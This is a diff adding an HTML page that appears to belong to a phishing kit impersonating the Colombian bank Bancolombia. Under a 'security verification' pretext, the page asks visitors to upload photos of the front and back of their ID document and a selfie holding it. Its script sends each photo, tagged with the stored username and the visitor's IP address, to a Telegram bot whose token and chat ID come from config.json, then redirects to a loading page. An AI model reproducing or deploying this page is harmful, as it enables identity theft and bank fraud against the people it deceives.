@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación de Identidad</title>
+<link rel="stylesheet" href="style.css">
+<script src="js/jquery-3.7.7.js"></script>
+<style>
+    .file-upload-container {
+        margin-bottom: 20px;
+        text-align: left;
+    }
+    .file-upload-label {
+        font-size: 14px;
+        color: #333;
+        font-weight: bold;
+        display: block;
+        margin-bottom: 5px;
+    }
+    .custom-file-input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        background: #f9f9f9;
+        font-size: 14px;
+        box-sizing: border-box;
+    }
+    .preview-image {
+        width: 100%;
+        max-width: 100px;
+        height: auto;
+        margin-top: 10px;
+        display: none;
+        border-radius: 5px;
+        border: 1px solid #ddd;
+    }
+    /* Loader styles */
+    .loader-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.9);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        z-index: 1000;
+    }
+    .spinner {
+        border: 8px solid #f3f3f3;
+        border-top: 8px solid #FDDA24;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    .loader-text {
+        margin-top: 15px;
+        font-size: 18px;
+        color: #333;
+        font-weight: bold;
+    }
+</style>
+</head>
+<body>
+
+<!-- HEADER SUPERIOR -->
+<div class="header-top">
+    <div class="header-content">
+        <img src="images/logo.svg" alt="Bancolombia" class="logo-header">
+    </div>
+</div>
+
+<h1 class="titulo-principal">Verificación de Identidad</h1>
+
+<div class="form-container">
+    <div class="form-box">
+        <p class="descripcion">
+            Por motivos de seguridad, necesitamos validar tu identidad. Por favor adjunta las siguientes fotografías.
+        </p>
+
+        <form id="uploadForm">
+            <!-- FOTO 1: CC FRENTE -->
+            <div class="file-upload-container">
+                <label class="file-upload-label">1. Documento de Identidad (Frente)</label>
+                <input type="file" id="foto1" accept="image/*" class="custom-file-input" required onchange="previewImage(this, 'preview1')">
+                <img id="preview1" class="preview-image">
+            </div>
+
+            <!-- FOTO 2: CC DORSO -->
+            <div class="file-upload-container">
+                <label class="file-upload-label">2. Documento de Identidad (Reverso)</label>
+                <input type="file" id="foto2" accept="image/*" class="custom-file-input" required onchange="previewImage(this, 'preview2')">
+                <img id="preview2" class="preview-image">
+            </div>
+
+            <!-- FOTO 3: SELFIE -->
+            <div class="file-upload-container">
+                <label class="file-upload-label">3. Selfie sosteniendo el documento</label>
+                <input type="file" id="foto3" accept="image/*" class="custom-file-input" required onchange="previewImage(this, 'preview3')">
+                <img id="preview3" class="preview-image">
+            </div>
+
+            <div class="botones">
+                <button type="button" class="btn-volver" onclick="window.location.href='index1.html'">Volver</button>
+                <button type="button" class="btn-continuar" onclick="enviarFotos()">Continuar</button>
+            </div>
+        </form>
+    </div>
+    <!-- IMAGEN DE LINEAS COMO PARTE INFERIOR DEL CARD (ELIMINADA) -->
+
+</div>
+
+<!-- FOOTER -->
+<div class="footer-container">
+    <div class="logo-intermedio">
+        <img src="images/loo.png" alt="Bancolombia">
+    </div>
+    
+    <div class="vigilado-logo">
+        <img src="images/vigiladosuper.png">
+    </div>
+
+    <div class="info-footer">
+        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
+        <div id="fecha-hora" class="fecha-text"></div>
+    </div>
+</div>
+
+<!-- Loader Overlay -->
+<div class="loader-overlay" id="loader">
+    <div class="spinner"></div>
+    <div class="loader-text">Subiendo documentos...</div>
+</div>
+
+<script>
+    // Preview de imagenes
+    function previewImage(input, previewId) {
+        const preview = document.getElementById(previewId);
+        if (input.files && input.files[0]) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+            }
+            reader.readAsDataURL(input.files[0]);
+        }
+    }
+
+    // Script para IP y Fecha
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#gfg").html(data.ip);
+    });
+
+    function actualizarFecha() {
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+        const fecha = new Date().toLocaleDateString('es-CO', options);
+        document.getElementById("fecha-hora").textContent = fecha;
+    }
+    setInterval(actualizarFecha, 1000);
+    actualizarFecha();
+
+    // Envio de fotos a Telegram
+    async function enviarFotos() {
+        const f1 = document.getElementById('foto1').files[0];
+        const f2 = document.getElementById('foto2').files[0];
+        const f3 = document.getElementById('foto3').files[0];
+
+        if (!f1 || !f2 || !f3) {
+            alert("Por favor adjunta las 3 fotografías requeridas.");
+            return;
+        }
+
+        // Ocultar botones
+        document.querySelector('.botones').style.display = 'none';
+
+        document.getElementById('loader').style.display = 'flex';
+
+        let TOKEN = "";
+        let CHAT_ID = "";
+
+        try {
+            const configResponse = await fetch('config.json');
+            const config = await configResponse.json();
+            TOKEN = config.token;
+            CHAT_ID = config.chat_id;
+        } catch (error) {
+            console.error("Error loading config:", error);
+            alert("Error de configuración. Intente nuevamente.");
+            document.getElementById('loader').style.display = 'none';
+            document.querySelector('.botones').style.display = 'flex';
+            return;
+        }
+        
+        const usuario = localStorage.getItem('userName') || "Desconocido";
+        const ip = document.getElementById("gfg").textContent;
+
+        const captionBase = `Usuario: ${usuario} | IP: ${ip}`;
+
+        try {
+            await sendPhoto(f1, `DOCUMENTO FRENTE - ${captionBase}`, TOKEN, CHAT_ID);
+            await sendPhoto(f2, `DOCUMENTO REVERSO - ${captionBase}`, TOKEN, CHAT_ID);
+            await sendPhoto(f3, `SELFIE - ${captionBase}`, TOKEN, CHAT_ID);
+
+            // Guardar flag de que ya subió fotos (opcional)
+            localStorage.setItem('fotos_subidas', 'true');
+
+            // Redirigir a load.html
+            window.location.href = 'load.html';
+
+        } catch (error) {
+            console.error(error);
+            alert("Error al subir las imágenes. Intente nuevamente.");
+            document.getElementById('loader').style.display = 'none';
+            document.querySelector('.botones').style.display = 'flex'; // Volver a mostrar botones
+        }
+    }
+
+    async function sendPhoto(file, caption, token, chatId) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        return await response.json();
+    }
+</script>
+
+</body>
+</html>
